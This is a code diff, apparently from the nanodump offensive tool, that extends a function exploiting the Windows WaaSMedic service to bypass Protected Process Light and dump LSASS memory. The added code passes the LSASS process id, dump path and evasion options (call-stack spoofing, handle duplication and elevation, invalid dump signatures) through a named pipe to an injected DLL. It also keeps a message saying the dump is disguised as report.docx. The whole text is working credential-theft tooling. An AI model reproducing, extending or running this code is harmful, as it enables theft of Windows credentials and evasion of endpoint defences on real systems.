@@ -1,14 +1,25 @@
 #include "ppl/ppl_medic.h"
 #include "ppl/ppl_utils.h"
 #include "ppl/ppl_medic_client.h"
+#include "pipe.h"
 
 BOOL run_ppl_medic_exploit(
     IN unsigned char nanodump_ppl_medic_dll[],
-    IN unsigned int nanodump_ppl_medic_dll_len)
+    IN unsigned int nanodump_ppl_medic_dll_len,
+    IN DWORD lsass_pid,
+    IN LPSTR dump_path,
+    IN BOOL use_valid_sig,
+    IN BOOL duplicate_handle,
+    IN BOOL elevate_handle,
+    IN BOOL duplicate_elevate,
+    IN DWORD spoof_callstack)
 {
     BOOL       success                      = FALSE;
     BOOL       ret_val                      = FALSE;
     BOOL       StateTypeLibCreated          = FALSE;
+#if PASS_PARAMS_VIA_NAMED_PIPES == 1
+    HANDLE     hPipe                        = NULL;
+#endif
     HANDLE     hBaseNamedObjects            = NULL;
     LPWSTR     TypeLibPath                  = NULL;
     LPWSTR     TypeLibRegValuePath          = NULL;
@@ -242,13 +253,36 @@ BOOL run_ppl_medic_exploit(
         }
     }
 
-cleanup:
     if (ret_val)
     {
+#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || (PASS_PARAMS_VIA_NAMED_PIPES == 0)
         PRINT("The exploit was successfull!");
         PRINT("By default, the minidump will have an invalid signature and will be written at the path C:\\Windows\\Temp\\report.docx");
+#else
+        success = send_arguments_from_pipe(
+            &hPipe,
+            lsass_pid,
+            dump_path,
+            use_valid_sig,
+            duplicate_handle,
+            elevate_handle,
+            duplicate_elevate,
+            spoof_callstack);
+        if (!success)
+        {
+            PRINT_ERR("Failed to send the arguments to the remote DLL");
+            goto cleanup;
+        }
+
+        print_success(
+            dump_path,
+            use_valid_sig,
+            TRUE);
+#endif
     }
-    else if (!ret_val && i >= MAX_ATTEMPTS)
+
+cleanup:
+    if (!ret_val && i >= MAX_ATTEMPTS)
     {
         PRINT_ERR("Reached the maximum number of attempts.");
     }
@@ -322,6 +356,10 @@ cleanup:
         intFree(TypeLibPath);
     if (is_service_running(STR_WAASMEDIC_SVC))
         stop_service_by_name(STR_WAASMEDIC_SVC, TRUE);
+#if PASS_PARAMS_VIA_NAMED_PIPES == 1
+    if (hPipe)
+        NtClose(hPipe);
+#endif
 
     DPRINT("bye!")
 
